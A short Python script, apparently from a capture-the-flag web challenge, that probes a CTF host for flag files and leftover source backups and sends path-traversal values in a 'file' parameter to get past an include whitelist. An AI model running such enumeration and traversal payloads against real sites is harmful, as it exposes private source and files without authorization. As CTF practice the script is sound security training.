# -*- coding: utf-8 -*-
"""枚举 static 目录下的 flag 文件 + 其他路径"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== /static/ 目录下的 flag 候选 ===')
paths = [
    '/static/ffffllllaaaagggg.php', '/static/ffffllllaaaagggg',
    '/static/ffffllllaaaagggg.txt', '/static/flag.php',
    '/static/source.php', '/static/hint.php', '/static/index.php',
    '/static/source.php~', '/static/hint.php~',
    '/ffffllllaaaagggg.php~', '/hint.php~', '/source.php~',
]
for p in paths:
    r = requests.get(base + p, timeout=6)
    if r.status_code == 200:
        print(f'  200! {p}: {r.text[:80].replace(chr(10), " ")}')
    elif r.status_code != 404:
        print(f'  {r.status_code} {p}')
print()

print('=== 源码备份/编辑器文件 ===')
for p in ['/source.php.bak', '/source.php.swp', '/hint.php.bak', '/.index.php.swp', '/index.php.bak', '/index.php~']:
    r = requests.get(base + p, timeout=6)
    if r.status_code != 404:
        print(f'  {r.status_code} {p}: {r.text[:60].replace(chr(10), " ")}')
print()

print('=== GET 传 file（vs POST 差异再确认）===')
for v in ['source.php?x', 'source.php%3fx', 'hint.php?../../ffffllllaaaagggg.php']:
    r = requests.get(base + '/', params={'file': v}, timeout=8)
    L = len(r.text)
    tag = 'include' if 'checkFile' in r.text or 'flag not here' in r.text else ('失败' if L < 500 else f'其他{L}')
    print(f'  GET file={v[:40]:<44} len={L} {tag}')
